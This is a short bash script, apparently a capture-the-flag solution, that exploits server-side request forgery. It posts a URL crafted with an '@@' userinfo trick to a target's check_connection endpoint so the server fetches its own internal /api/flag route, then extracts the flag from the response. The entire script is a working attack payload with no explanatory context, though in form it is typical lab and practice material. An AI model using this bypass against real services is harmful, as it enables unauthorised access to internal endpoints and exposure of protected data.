#!/bin/bash

URL=$1

if [ -z "$URL" ]; then
    echo "Usage: $0 <url>"
    exit 1
fi

curl -s -d '{"url":"http://www.google.com@@127.0.0.1:3000/api/flag"}' -H 'Content-Type: application/json' $URL/api/check_connection | grep -oE 'flag{.*}'
